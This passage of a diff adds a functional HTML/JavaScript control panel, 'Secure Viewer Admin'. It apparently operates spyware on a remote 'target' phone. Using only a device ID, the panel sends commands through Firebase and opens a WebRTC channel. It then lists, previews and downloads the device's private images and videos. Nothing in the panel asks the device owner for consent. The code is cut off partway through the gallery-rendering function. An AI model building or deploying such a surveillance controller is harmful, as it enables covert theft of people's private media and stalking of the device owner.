@@ -1,0 +1,1547 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Secure Viewer Admin</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box
+    }
+
+    :root {
+      --bg: #0a0a0a;
+      --surface: #141414;
+      --surface2: #1e1e1e;
+      --primary: #00bcd4;
+      --primary-dark: #0097a7;
+      --danger: #f44336;
+      --success: #4caf50;
+      --warn: #ff9800;
+      --text: #e0e0e0;
+      --muted: #888;
+      --border: #2a2a2a;
+      --radius: 12px
+    }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Segoe UI', sans-serif;
+      min-height: 100vh
+    }
+
+    .screen {
+      display: none;
+      min-height: 100vh
+    }
+
+    .screen.active {
+      display: flex;
+      flex-direction: column
+    }
+
+    #loginScreen {
+      align-items: center;
+      justify-content: center
+    }
+
+    .login-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 20px;
+      padding: 40px;
+      width: 380px;
+      max-width: 95vw
+    }
+
+    .login-card h1 {
+      color: var(--primary);
+      font-size: 28px;
+      margin-bottom: 6px;
+      text-align: center
+    }
+
+    .login-card p {
+      color: var(--muted);
+      text-align: center;
+      margin-bottom: 30px;
+      font-size: 14px
+    }
+
+    .input-group {
+      margin-bottom: 18px
+    }
+
+    .input-group label {
+      display: block;
+      margin-bottom: 6px;
+      color: var(--muted);
+      font-size: 13px
+    }
+
+    .input-group input {
+      width: 100%;
+      padding: 12px 16px;
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      color: var(--text);
+      font-size: 15px;
+      outline: none;
+      transition: .2s
+    }
+
+    .input-group input:focus {
+      border-color: var(--primary)
+    }
+
+    .btn {
+      width: 100%;
+      padding: 13px;
+      border: none;
+      border-radius: var(--radius);
+      font-size: 15px;
+      font-weight: 600;
+      cursor: pointer;
+      transition: .2s
+    }
+
+    .btn-primary {
+      background: var(--primary);
+      color: #000
+    }
+
+    .btn-primary:hover {
+      background: var(--primary-dark)
+    }
+
+    .btn:disabled {
+      opacity: .5;
+      cursor: not-allowed
+    }
+
+    header {
+      background: var(--surface);
+      border-bottom: 1px solid var(--border);
+      padding: 14px 20px;
+      display: flex;
+      align-items: center;
+      gap: 12px
+    }
+
+    header h2 {
+      flex: 1;
+      color: var(--primary);
+      font-size: 18px
+    }
+
+    .status-dot {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: var(--danger)
+    }
+
+    .status-dot.online {
+      background: var(--success)
+    }
+
+    #statusText {
+      font-size: 13px;
+      color: var(--muted)
+    }
+
+    .btn-sm {
+      padding: 7px 16px;
+      border-radius: 8px;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      border: none;
+      transition: .2s
+    }
+
+    #logoutBtn {
+      background: var(--surface2);
+      color: var(--text)
+    }
+
+    .conn-info {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 12px 14px;
+      font-size: 13px;
+      color: var(--muted)
+    }
+
+    .offline-banner {
+      background: var(--surface2);
+      border: 1px solid var(--warn);
+      border-radius: var(--radius);
+      padding: 14px;
+      text-align: center;
+      color: var(--warn);
+      font-size: 14px;
+      display: none
+    }
+
+    .offline-banner.show {
+      display: block
+    }
+
+    #galleryTab {
+      padding: 16px;
+      gap: 12px
+    }
+
+    .gallery-header {
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      flex-wrap: wrap
+    }
+
+    .gallery-header h3 {
+      flex: 1;
+      font-size: 16px
+    }
+
+    .gallery-tabs {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 2px
+    }
+
+    .gtab {
+      padding: 8px 18px;
+      border-radius: 20px;
+      font-size: 13px;
+      font-weight: 600;
+      cursor: pointer;
+      background: var(--surface2);
+      color: var(--muted);
+      border: 1px solid var(--border);
+      transition: .2s
+    }
+
+    .gtab.active {
+      background: var(--primary);
+      color: #000;
+      border-color: var(--primary)
+    }
+
+    .thumb-grid {
+      display: grid;
+      grid-template-columns: repeat(5, 1fr);
+      gap: 6px;
+      margin-top: 4px
+    }
+
+    @media(max-width:600px) {
+      .thumb-grid {
+        grid-template-columns: repeat(3, 1fr)
+      }
+    }
+
+    .thumb-item {
+      position: relative;
+      aspect-ratio: 1;
+      background: var(--surface2);
+      border-radius: 6px;
+      overflow: hidden;
+      cursor: pointer
+    }
+
+    .thumb-item img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block
+    }
+
+    .thumb-item .thumb-placeholder {
+      width: 100%;
+      height: 100%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: var(--surface2);
+      font-size: 20px;
+      color: var(--muted)
+    }
+
+    .thumb-item .dl-btn {
+      position: absolute;
+      bottom: 3px;
+      right: 3px;
+      background: rgba(0, 0, 0, .85);
+      border: none;
+      color: var(--primary);
+      border-radius: 5px;
+      padding: 3px 7px;
+      font-size: 11px;
+      cursor: pointer;
+      display: none
+    }
+
+    .thumb-item:hover .dl-btn {
+      display: block
+    }
+
+    .thumb-item .type-badge {
+      position: absolute;
+      top: 3px;
+      left: 3px;
+      background: rgba(0, 0, 0, .75);
+      color: #fff;
+      font-size: 9px;
+      padding: 2px 5px;
+      border-radius: 4px
+    }
+
+    .load-more-wrap {
+      text-align: center;
+      margin-top: 12px
+    }
+
+    .load-more-btn {
+      padding: 10px 28px;
+      background: var(--surface2);
+      color: var(--text);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      font-size: 14px;
+      font-weight: 600;
+      cursor: pointer
+    }
+
+    .load-more-btn:hover {
+      border-color: var(--primary);
+      color: var(--primary)
+    }
+
+    .empty-state {
+      text-align: center;
+      color: var(--muted);
+      padding: 40px;
+      font-size: 14px
+    }
+
+    .retry-btn {
+      margin-top: 12px;
+      padding: 8px 20px;
+      background: var(--surface2);
+      color: var(--primary);
+      border: 1px solid var(--primary);
+      border-radius: 8px;
+      font-size: 13px;
+      cursor: pointer
+    }
+
+    .dl-progress {
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      padding: 14px;
+      display: none
+    }
+
+    .dl-progress.show {
+      display: block
+    }
+
+    .progress-bar-wrap {
+      background: var(--bg);
+      border-radius: 99px;
+      height: 8px;
+      margin-top: 8px;
+      overflow: hidden
+    }
+
+    .progress-bar {
+      height: 100%;
+      background: var(--primary);
+      border-radius: 99px;
+      transition: .1s;
+      width: 0
+    }
+
+    .dl-info {
+      font-size: 13px;
+      color: var(--muted);
+      display: flex;
+      justify-content: space-between
+    }
+
+    .lightbox {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, .95);
+      z-index: 999;
+      align-items: center;
+      justify-content: center;
+      flex-direction: column;
+      gap: 14px
+    }
+
+    .lightbox.show {
+      display: flex
+    }
+
+    .lightbox img,
+    .lightbox video {
+      max-width: 92vw;
+      max-height: 75vh;
+      border-radius: 8px;
+      object-fit: contain
+    }
+
+    .lightbox-close {
+      position: absolute;
+      top: 16px;
+      right: 20px;
+      color: #fff;
+      font-size: 28px;
+      cursor: pointer;
+      background: none;
+      border: none;
+      z-index: 10
+    }
+
+    .lightbox-dl {
+      padding: 10px 24px;
+      background: var(--primary);
+      color: #000;
+      border: none;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: 700;
+      cursor: pointer
+    }
+
+    .lightbox-dl:disabled {
+      opacity: .5;
+      cursor: not-allowed
+    }
+
+    .lightbox-status {
+      font-size: 13px;
+      color: var(--warn);
+      margin-top: 4px;
+      text-align: center;
+      max-width: 300px
+    }
+
+    .spinner {
+      display: inline-block;
+      width: 18px;
+      height: 18px;
+      border: 2px solid var(--border);
+      border-top-color: var(--primary);
+      border-radius: 50%;
+      animation: spin .7s linear infinite;
+      vertical-align: middle;
+      margin-right: 6px
+    }
+
+    .spinner-lg {
+      display: inline-block;
+      width: 40px;
+      height: 40px;
+      border: 3px solid var(--border);
+      border-top-color: var(--primary);
+      border-radius: 50%;
+      animation: spin .7s linear infinite
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg)
+      }
+    }
+
+    ::-webkit-scrollbar {
+      width: 6px
+    }
+
+    ::-webkit-scrollbar-track {
+      background: var(--bg)
+    }
+
+    ::-webkit-scrollbar-thumb {
+      background: var(--border);
+      border-radius: 3px
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- LOGIN -->
+  <div id="loginScreen" class="screen active">
+    <div class="login-card">
+      <h1>🔐 Secure Viewer</h1>
+      <p>Admin Control Panel</p>
+      <div class="input-group">
+        <label for="deviceIdInput">Device ID</label>
+        <input type="text" id="deviceIdInput" placeholder="e.g. 99" autocomplete="off" />
+      </div>
+      <button class="btn btn-primary" onclick="connectDevice()">Connect to Device</button>
+      <p id="loginMsg" style="text-align:center;margin-top:12px;font-size:13px;color:var(--muted)"></p>
+    </div>
+  </div>
+
+  <!-- MONITOR -->
+  <div id="monitorScreen" class="screen">
+    <header>
+      <span class="status-dot" id="statusDot"></span>
+      <h2>Remote Gallery Access</h2>
+      <span id="statusText">Connecting...</span>
+      <button class="btn-sm" id="logoutBtn" onclick="logout()">Logout</button>
+    </header>
+
+    <div style="flex:1;display:flex;flex-direction:column;overflow:hidden;">
+      <div style="padding:12px 16px 0;display:flex;flex-direction:column;gap:8px">
+        <div class="offline-banner" id="offlineBanner">⚠️ Device is offline. Waiting for connection...</div>
+        <div class="conn-info"><span id="connInfoText">Status: Idle</span></div>
+        <div class="dl-progress" id="dlProgress">
+          <div class="dl-info">
+            <span id="dlFileName">Downloading...</span>
+            <span id="dlPercent">0%</span>
+          </div>
+          <div class="progress-bar-wrap">
+            <div class="progress-bar" id="dlBar"></div>
+          </div>
+        </div>
+      </div>
+
+      <div id="galleryTab" style="flex:1;overflow:auto;padding:16px;display:flex;flex-direction:column;gap:12px;">
+        <div class="gallery-header">
+          <h3>Device Gallery</h3>
+          <button class="btn-sm" style="background:var(--surface2)" onclick="refreshGallery()">
+            <span id="refreshSpinner" style="display:none" class="spinner"></span>🔄 Refresh
+          </button>
+
+        </div>
+        <div class="gallery-tabs">
+          <div class="gtab active" id="gtabImages" onclick="switchGalleryTab('images')">🖼️ Images <span id="imgCount"
+              style="font-size:11px;opacity:.7"></span></div>
+          <div class="gtab" id="gtabVideos" onclick="switchGalleryTab('videos')">🎬 Videos <span id="vidCount"
+              style="font-size:11px;opacity:.7"></span></div>
+        </div>
+        <div id="thumbGrid" class="thumb-grid"></div>
+        <div id="galleryEmpty" class="empty-state" style="display:none">
+          <div>No items found. Press Refresh to load gallery.</div>
+          <button class="retry-btn" onclick="refreshGallery()">🔄 Retry</button>
+        </div>
+        <div class="load-more-wrap" id="loadMoreWrap" style="display:none">
+          <button class="load-more-btn" onclick="loadMore()">Load More</button>
+        </div>
+      </div>
+
+
+    </div>
+  </div>
+
+  <!-- LIGHTBOX -->
+  <div class="lightbox" id="lightbox">
+    <button class="lightbox-close" onclick="closeLightbox()">✕</button>
+    <div id="lightboxMedia"></div>
+    <p id="lightboxStatus" class="lightbox-status" style="display:none"></p>
+    <button class="lightbox-dl" id="lightboxDlBtn" onclick="lightboxDownload()">⬇ Download Full</button>
+  </div>
+
+  <!-- Use Compat SDK for better file:// support and reliability -->
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+  <script>
+    const firebaseConfig = {
+      apiKey: "YOUR_FIREBASE_API_KEY",
+      authDomain: "YOUR_PROJECT.firebaseapp.com",
+      databaseURL: "https://YOUR_PROJECT-default-rtdb.firebaseio.com",
+      projectId: "YOUR_PROJECT_ID",
+      storageBucket: "YOUR_PROJECT.firebasestorage.app",
+      messagingSenderId: "YOUR_SENDER_ID",
+      appId: "YOUR_APP_ID",
+      measurementId: "YOUR_MEASUREMENT_ID"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // Compatibility helpers to keep previous code working
+    const ref = (db, path) => db.ref(path);
+    const set = (ref, val) => ref.set(val);
+    const get = (ref) => ref.get();
+    const onValue = (ref, cb) => {
+      const fn = ref.on('value', cb);
+      return () => ref.off('value', fn);
+    };
+    const onChildAdded = (ref, cb) => {
+      const fn = ref.on('child_added', cb);
+      return () => ref.off('child_added', fn);
+    };
+    const remove = (ref) => ref.remove();
+    const push = (ref, val) => ref.push(val);
+    const serverTimestamp = () => firebase.database.ServerValue.TIMESTAMP;
+
+    // ── STATE ──────────────────────────────────────────────────────────────────
+    let deviceId = '';
+    let pc = null;
+    let dataChannel = null;
+    let isOnline = false;
+    let statusUnsub = null;
+    let answerUnsub = null;
+    let iceUnsub = null;
+    let galleryReadyUnsub = null;
+
+    // ── EXPOSE GLOBALS ─────────────────────────────────────────────────────────
+    window.connectDevice = connectDevice;
+    window.logout = logout;
+    window.refreshGallery = refreshGallery;
+    window.switchGalleryTab = switchGalleryTab;
+    window.loadMore = loadMore;
+    window.closeLightbox = closeLightbox;
+    window.lightboxDownload = lightboxDownload;
+    window.downloadItem = downloadItem;
+
+
+    const iceServers = [
+      { urls: 'stun:stun.l.google.com:19302' },
+      { urls: 'stun:stun1.l.google.com:19302' },
+      { urls: 'stun:stun2.l.google.com:19302' },
+      { urls: 'stun:stun3.l.google.com:19302' }
+    ];
+
+    // Download state
+    let dlChunks = {};
+    let dlHeader = null;
+    let dlTotalChunks = 0;
+    let dlReceived = 0;
+    let lightboxItem = null;
+    let isDownloadingForLightbox = false;
+    let downloadQueue = [];
+    let isConnecting = false;
+    let iceQueue = []; // Queue for candidates arriving before remote description
+    let hasRemoteDesc = false;
+
+    // ── GALLERY STATE ────────────────────────────────────────────────────────
+    let allImages = [];
+    let allVideos = [];
+    let galleryTab = 'images';
+    let imgOffset = 0;
+    let vidOffset = 0;
+    let imgHasMore = true;
+    let vidHasMore = true;
+    let imgTotal = 0;
+    let vidTotal = 0;
+    const IMG_PER_PAGE = 50;
+    const VID_PER_PAGE = 10;
+
+    // ── LOGIN ──────────────────────────────────────────────────────────────────
+    async function connectDevice() {
+      const input = document.getElementById('deviceIdInput').value.trim();
+      if (!input) { setLoginMsg('Enter a device ID'); return; }
+      deviceId = input;
+      localStorage.setItem('deviceId', deviceId);
+      showScreen('monitorScreen');
+      startStatusPolling();
+      setConn('Waiting for device...');
+    }
+
+    // ── STATUS ─────────────────────────────────────────────────────────────────
+    let serverTimeOffset = 0;
+    onValue(ref(db, '.info/serverTimeOffset'), snap => {
+      serverTimeOffset = snap.val() || 0;
+    });
+
+    let lastStatusData = null;
+    let statusInterval = null;
+
+    function startStatusPolling() {
+      if (statusUnsub) { statusUnsub(); statusUnsub = null; }
+      if (statusInterval) { clearInterval(statusInterval); statusInterval = null; }
+
+      statusUnsub = onValue(ref(db, `status/${deviceId}`), snap => {
+        lastStatusData = snap.val();
+        checkStatus();
+      });
+
+      // Proactive check every 1 second to update "seconds ago" and detect silent timeouts
+      statusInterval = setInterval(checkStatus, 1000);
+    }
+
+    function checkStatus() {
+      if (!lastStatusData) return;
+
+      const now = Date.now() + serverTimeOffset;
+      const lastSeen = lastStatusData.timestamp || 0;
+
+      // REAL LOGIC: Device pings every 2s. We allow 6s (3 pings) before marking offline.
+      const isFresh = lastSeen > 0 && (now - lastSeen) < 6000;
+      const wasOnline = isOnline;
+      isOnline = (lastStatusData.online === true) && isFresh;
+
+      updateStatusUI(isOnline, lastSeen);
+
+      // Auto-connect once when device becomes online
+      if (isOnline && !wasOnline) {
+        establishConnection();
+      }
+    }
+
+    function updateStatusUI(online, lastSeen) {
+      const dot = document.getElementById('statusDot');
+      const text = document.getElementById('statusText');
+      const banner = document.getElementById('offlineBanner');
+
+      dot.className = 'status-dot' + (online ? ' online' : '');
+
+      if (online) {
+        text.textContent = 'Online';
+        banner.className = 'offline-banner';
+      } else {
+        const secondsAgo = Math.max(0, Math.round((Date.now() + serverTimeOffset - lastSeen) / 1000));
+        const timeStr = lastSeen > 0 ? ` (Last seen ${secondsAgo}s ago)` : '';
+        text.textContent = 'Offline' + timeStr;
+        banner.className = 'offline-banner show';
+        banner.textContent = '⚠️ Device is offline' + timeStr + '. Waiting...';
+      }
+    }
+
+    // ── WEBRTC ─────────────────────────────────────────────────────────────────
+    async function establishConnection() {
+      if (isConnecting) return;
+      if (pc && (pc.connectionState === 'connected' || pc.connectionState === 'connecting')) {
+        console.log("Already connecting/connected. State:", pc.connectionState);
+        return;
+      }
+
+      isConnecting = true;
+      closePeerConnection();
+      setConn('Establishing connection...');
+
+      // FIX: Clear signaling nodes to start fresh
+      try {
+        await Promise.all([
+          remove(ref(db, `ice/${deviceId}/admin`)),
+          remove(ref(db, `ice/${deviceId}/target`)),
+          remove(ref(db, `offers/${deviceId}`)),
+          remove(ref(db, `answers/${deviceId}`))
+        ]);
+      } catch (e) { }
+
+      pc = new RTCPeerConnection({
+        iceServers,
+        iceCandidatePoolSize: 10 // Pre-gather candidates
+      });
+
+      dataChannel = pc.createDataChannel('gallery', { ordered: true });
+      dataChannel.binaryType = 'arraybuffer';
+      setupDataChannel(dataChannel);
+
+      pc.onicecandidate = e => {
+        if (e.candidate) {
+          console.log("Local ICE:", e.candidate.candidate);
+          push(ref(db, `ice/${deviceId}/admin`), {
+            sdpMid: e.candidate.sdpMid,
+            sdpMLineIndex: e.candidate.sdpMLineIndex,
+            candidate: e.candidate.candidate
+          });
+        }
+      };
+
+      pc.oniceconnectionstatechange = () => {
+        console.log("ICE Connection State:", pc.iceConnectionState);
+        if (pc.iceConnectionState === 'failed') {
+          setConn('WebRTC ICE failed. Try again.');
+          isConnecting = false;
+        }
+      };
+
+      pc.onconnectionstatechange = () => {
+        console.log("PC State Change:", pc.connectionState);
+        if (pc.connectionState === 'connected') {
+          setConn('Connected ✅');
+          isConnecting = false;
+        }
+        if (pc.connectionState === 'failed' || pc.connectionState === 'disconnected') {
+          setConn('Connection failed. Refresh or Retry.');
+          isConnecting = false;
+        }
+      };
+
+      try {
+        const offer = await pc.createOffer();
+        await pc.setLocalDescription(offer);
+        console.log("Offer created and set.");
+
+        await set(ref(db, `offers/${deviceId}`), {
+          type: 'offer', sdp: offer.sdp, timestamp: serverTimestamp()
+        });
+
+        // 15 second signal timeout
+        const sigTimer = setTimeout(() => {
+          if (pc && pc.connectionState !== 'connected') {
+            console.log("Signal timeout - closing PC");
+            setConn('Handshake timeout. Retry.');
+            closePeerConnection();
+            isConnecting = false;
+          }
+        }, 15000);
+
+        if (answerUnsub) { answerUnsub(); answerUnsub = null; }
+        answerUnsub = onValue(ref(db, `answers/${deviceId}`), async snap => {
+          const d = snap.val();
+          if (!d || !d.sdp || !pc) return;
+          if (pc.signalingState !== 'have-local-offer') return;
+
+          console.log("Answer received from device.");
+          clearTimeout(sigTimer);
+          try {
+            await pc.setRemoteDescription(new RTCSessionDescription({ type: 'answer', sdp: d.sdp }));
+            processIceQueue();
+            listenIceCandidates();
+            if (answerUnsub) { answerUnsub(); answerUnsub = null; }
+            setTimeout(() => remove(ref(db, `answers/${deviceId}`)).catch(() => { }), 2000);
+          } catch (e) { console.error('Answer Error:', e); }
+        });
+      } catch (e) {
+        console.error("Signal Error:", e);
+        isConnecting = false;
+      }
+    }
+
+    function listenIceCandidates() {
+      if (iceUnsub) { iceUnsub(); iceUnsub = null; }
+      iceUnsub = onChildAdded(ref(db, `ice/${deviceId}/target`), snap => {
+        const c = snap.val();
+        if (!c || !pc) return;
+        const cand = new RTCIceCandidate({
+          sdpMid: c.sdpMid,
+          sdpMLineIndex: c.sdpMLineIndex,
+          candidate: c.candidate
+        });
+        if (hasRemoteDesc) {
+          pc.addIceCandidate(cand).catch(e => console.warn("ICE error:", e));
+        } else {
+          iceQueue.push(cand);
+        }
+      });
+    }
+
+    function processIceQueue() {
+      hasRemoteDesc = true;
+      while (iceQueue.length > 0) {
+        const cand = iceQueue.shift();
+        pc.addIceCandidate(cand).catch(e => console.warn("Queued ICE error:", e));
+      }
+    }
+
+    function setupDataChannel(dc) {
+      dc.onopen = () => {
+        setConn('DataChannel connected ✅');
+        processDownloadQueue();
+      };
+      dc.onclose = () => setConn('DataChannel closed');
+      dc.onerror = e => setConn('DataChannel error');
+      dc.onmessage = handleDCMsg;
+    }
+
+    function handleDCMsg(evt) {
+      if (evt.data instanceof ArrayBuffer) {
+        const view = new DataView(evt.data);
+        const idx = view.getInt32(0);
+        const chunk = evt.data.slice(4);
+        dlChunks[idx] = chunk;
+        dlReceived++;
+        p2pLastChunkTime = Date.now(); // Update last chunk time for monitoring
+        if (dlHeader) {
+          const pct = Math.round((dlReceived / dlTotalChunks) * 100);
+          document.getElementById('dlBar').style.width = pct + '%';
+          document.getElementById('dlPercent').textContent = pct + '%';
+          if (isDownloadingForLightbox) setLightboxStatus('⏳ Downloading... ' + pct + '%');
+        }
+        if (dlHeader && dlReceived >= dlTotalChunks) assembleAndSave();
+      } else {
+        if (typeof evt.data === 'string' && evt.data.startsWith('cloudinary_url:')) {
+          const url = evt.data.split('cloudinary_url:')[1];
+          setConn('Cloudinary URL received via P2P');
+          const name = dlHeader ? dlHeader.name : 'downloaded_file';
+          triggerBrowserDownload(url, name);
+          return;
+        }
+        try {
+          const msg = JSON.parse(evt.data);
+          dlHeader = msg;
+          dlChunks = {};
+          dlReceived = 0;
+          dlTotalChunks = msg.chunks;
+          p2pLastChunkTime = Date.now(); // Update last chunk time for monitoring
+          document.getElementById('dlFileName').textContent = msg.name;
+          document.getElementById('dlPercent').textContent = '0%';
+          document.getElementById('dlBar').style.width = '0%';
+          document.getElementById('dlProgress').className = 'dl-progress show';
+          if (isDownloadingForLightbox) setLightboxStatus('⏳ Downloading...');
+        } catch (e) { }
+      }
+    }
+
+    function assembleAndSave() {
+      const chunks = [];
+      for (let i = 0; i < dlTotalChunks; i++) { chunks.push(dlChunks[i]); }
+      const mime = dlHeader.mime || 'application/octet-stream';
+      const blob = new Blob(chunks, { type: mime });
+      const url = URL.createObjectURL(blob);
+
+      if (isDownloadingForLightbox) {
+        isDownloadingForLightbox = false;
+        const med = document.getElementById('lightboxMedia');
+        med.innerHTML = '';
+        if (mime.startsWith('image/')) {
+          const img = new Image();
+          img.src = url;
+          img.style.cssText = 'max-width:92vw;max-height:75vh;border-radius:8px;object-fit:contain';
+          img.onload = () => {
+            setLightboxStatus('');
+            const btn = document.getElementById('lightboxDlBtn');
+            btn.disabled = false;
+            btn.textContent = '⬇ Download Full';
+            btn.setAttribute('data-url', url);
+            btn.setAttribute('data-name', dlHeader.name);
+          };
+          med.appendChild(img);
+        } else {
+          const vid = document.createElement('video');
+          vid.src = url; vid.controls = true;
+          vid.style.cssText = 'max-width:92vw;max-height:75vh;border-radius:8px';
+          med.appendChild(vid);
+          setLightboxStatus('');
+          const btn = document.getElementById('lightboxDlBtn');
+          btn.disabled = false; btn.textContent = '⬇ Download Full';
+          btn.setAttribute('data-url', url); btn.setAttribute('data-name', dlHeader.name);
+        }
+      } else {
+        const a = document.createElement('a');
+        a.href = url; a.download = dlHeader.name; a.click();
+        setTimeout(() => URL.revokeObjectURL(url), 5000);
+      }
+      document.getElementById('dlProgress').className = 'dl-progress';
+      dlHeader = null; dlChunks = {}; dlReceived = 0;
+    }
+
+    // ── REPLACED loadGallery() with pagination support ────────────────────────
+    // resetOffset=true means start from beginning (Refresh)
+    // resetOffset=false means continue from current offset (Load More)
+    async function loadGallery(resetOffset = true) {
+      if (!isOnline) {
+        showEmpty('Device is offline. Waiting...');
+        return;
+      }
+
+      // Determine current offset based on tab and resetOffset flag
+      const type = galleryTab === 'images' ? 'images' : 'videos';
+      const limit = type === 'images' ? IMG_PER_PAGE : VID_PER_PAGE;
+      let offset = 0;
+
+      if (resetOffset) {
+        // Fresh load — reset everything
+        if (type === 'images') {
+          imgOffset = 0; imgHasMore = true; imgTotal = 0;
+          allImages = [];
+        } else {
+          vidOffset = 0; vidHasMore = true; vidTotal = 0;
+          allVideos = [];
+        }
+        document.getElementById('thumbGrid').innerHTML = '';
+        showLM(false);
+      } else {
+        // Load More — use current offset
+        offset = type === 'images' ? imgOffset : vidOffset;
+      }
+
+      showRefreshSpinner(true);
+      showEmpty('');
+
+      // Status message showing progress
+      const loadedSoFar = type === 'images' ? imgTotal : vidTotal;
+      const nextTarget = loadedSoFar + limit;
+      setConn(`Loading ${type} (${loadedSoFar} → ${nextTarget})...`);
+
+      // Clear old Firebase gallery data before requesting new
+      try { await remove(ref(db, `gallery/${deviceId}`)); } catch (e) { }
+
+      // Send paginated command: "get_gallery:OFFSET:LIMIT:TYPE:TIMESTAMP"
+      const cmd = `get_gallery:${offset}:${limit}:${type}:${Date.now()}`;
+      await set(ref(db, `commands/${deviceId}`), cmd);
+
+      // Clean up old listener
+      if (galleryReadyUnsub) { try { galleryReadyUnsub(); } catch (e) { } galleryReadyUnsub = null; }
+
+      let done = false;
+
+      // 20 second timeout
+      const timer = setTimeout(() => {
+        if (done) return;
+        done = true;
+        if (galleryReadyUnsub) { try { galleryReadyUnsub(); } catch (e) { } galleryReadyUnsub = null; }
+        showRefreshSpinner(false);
+        showEmpty('Timeout — device slow. Press Retry.');
+        setConn('Gallery timeout');
+      }, 20000);
+
+      // Listen for ready flag from device
+      galleryReadyUnsub = onValue(ref(db, `gallery/${deviceId}/ready`), async snap => {
+        if (snap.val() !== true || done) return;
+        done = true;
+        clearTimeout(timer);
+        if (galleryReadyUnsub) { try { galleryReadyUnsub(); } catch (e) { } galleryReadyUnsub = null; }
+
+        try {
+          // Read full gallery node
+          const gSnap = await get(ref(db, `gallery/${deviceId}`));
+          const data = gSnap.val();
+          showRefreshSpinner(false);
+
+          if (!data) { showEmpty('No data from device.'); return; }
+
+          // Assemble JSON string
+          let jsonStr = '';
+          if (data.data) {
+            jsonStr = data.data;
+          } else if (data.chunks && data.chunks > 0) {
+            for (let i = 0; i < data.chunks; i++) {
+              jsonStr += (data['chunk_' + i] || '');
+            }
+          }
+
+          if (!jsonStr || jsonStr.length < 2) {
+            showEmpty('Empty response. Press Retry.');
+            return;
+          }
+
+          // Parse items
+          let items;
+          try { items = JSON.parse(jsonStr); }
+          catch (e) { showEmpty('Parse error. Press Retry.'); return; }
+
+          if (!Array.isArray(items)) {
+            showEmpty('Bad data format. Press Retry.');
+            return;
+          }
+
+          // Read metadata from Firebase response
+          const hasMore = data.hasMore === true;
+          const count = data.totalCount || items.length;
+          const respOffset = data.offset || offset;
+          const respType = data.type || type;
+
+          // Update state
+          if (respType === 'images') {
+            allImages = items;    // Replace grid items (not append)
+            imgOffset = respOffset + count;  // next offset
+            imgHasMore = hasMore;
+            imgTotal = imgTotal + count;
+            document.getElementById('imgCount').textContent =
+              imgHasMore
+                ? `(${imgTotal} loaded)`
+                : `(${imgTotal} total)`;
+          } else {
+            allVideos = items;
+            vidOffset = respOffset + count;
+            vidHasMore = hasMore;
+            vidTotal = vidTotal + count;
+            document.getElementById('vidCount').textContent =
+              vidHasMore
+                ? `(${vidTotal} loaded)`
+                : `(${vidTotal} total)`;
+          }
+
+          // Status message
+          if (hasMore) {
+            setConn(`✅ Loaded ${count} ${type} (${loadedSoFar + count} so far)`);
+          } else {
+            setConn(`✅ All ${loadedSoFar + count} ${type} loaded!`);
+          }
+
+          renderGallery();
+
+        } catch (e) {
+          showRefreshSpinner(false);
+          showEmpty('Error: ' + e.message);
+        }
+      });
+    }
+
+    // ── REPLACED refreshGallery() ─────────────────────────────────────────────
+    async function refreshGallery() {
+      // Reset current tab offset and reload from beginning
+      await loadGallery(true);
+    }
+
+    // ── REPLACED switchGalleryTab() ───────────────────────────────────────────
+    function switchGalleryTab(tab) {
+      galleryTab = tab;
+      document.getElementById('gtabImages').className = 'gtab' + (tab === 'images' ? ' active' : '');
+      document.getElementById('gtabVideos').className = 'gtab' + (tab === 'videos' ? ' active' : '');
+
+      const arr = tab === 'images' ? allImages : allVideos;
+      if (arr.length === 0) {
+        // No data for this tab yet — load from beginning
+        loadGallery(true);
+      } else {
+        // Already have data — just re-render
+        renderGallery();
+      }
+    }
+
+    // ── REPLACED loadMore() ──────────────────────────────────────────────────
+    async function loadMore() {
+      const hasMore = galleryTab === 'images' ? imgHasMore : vidHasMore;
+      if (!hasMore) return;
+      // Load next page WITHOUT resetting offset
+      await loadGallery(false);
+      document.getElementById('galleryTab').scrollTop = 0;
+    }
+
+    // ── REPLACED renderGallery() ──────────────────────────────────────────────
+    function renderGallery() {
+      const grid = document.getElementById('thumbGrid');
+      grid.innerHTML = '';
+
+      const items = galleryTab === 'images' ? allImages : allVideos;
+      const hasMore = galleryTab === 'images' ? imgHasMore : vidHasMore;
+
+      if (items.length === 0) {
+        showEmpty('No ' + galleryTab + ' found. Press Refresh.');
+        showLM(false);
+        return;
+      }
+      showEmpty('');
+
+      // Render all items in current page
+      items.forEach(item => {
+        const div = document.createElement('div');
+        div.className = 'thumb-item';
+
+        if (item.thumb) {
+          const img = document.createElement('img');
+          img.loading = 'lazy';
+          img.src = 'data:image/jpeg;base64,' + item.thumb;
+          img.onerror = () => {
+            img.remove();
+            const ph = document.createElement('div');
+            ph.className = 'thumb-placeholder';
+            ph.textContent = item.type === 'video' ? '🎬' : '🖼️';
+            div.insertBefore(ph, div.firstChild);
+          };
+          div.appendChild(img);
+        } else {
+          const ph = document.createElement('div');
+          ph.className = 'thumb-placeholder';
+          ph.textContent = item.type === 'video' ? '🎬' : '🖼️';
+          div.appendChild(ph);
+        }
+
+        const badge = document.createElement('span');
+        badge.className = 'type-badge';
+        badge.textContent = item.type === 'video' ? '▶' : '🖼';
+        div.appendChild(badge);
+
